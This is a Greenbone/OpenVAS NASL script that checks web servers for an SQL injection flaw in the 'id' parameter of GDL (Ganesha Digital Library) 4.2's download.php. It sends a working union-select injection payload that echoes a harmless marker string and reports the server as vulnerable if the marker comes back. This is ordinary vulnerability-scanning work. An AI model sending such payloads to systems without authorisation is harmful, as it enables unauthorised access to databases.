if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100906" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-11-16 13:35:09 +0100 (Tue, 16 Nov 2010)" );
	script_bugtraq_id( 44786 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "GDL 'id' Parameter SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/44786" );
	script_xref( name: "URL", value: "http://kmrg.itb.ac.id/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Reports indicate that this issue has been fixed by the vendor but
Symantec has not confirmed it. Please contact the vendor for more
information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "GDL (Ganesha Digital Library) is prone to an SQL-injection
vulnerability because it fails to sufficiently sanitize user-supplied
data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

GDL 4.2 is vulnerable, other versions may also be affected." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/gdl", "/gdl42", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/download.php?id=-1+union+select+1,0x53514c2d496e6a656374696f6e2d54657374" );
	if(http_vuln_check( port: port, url: url, pattern: "SQL-Injection-Test" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

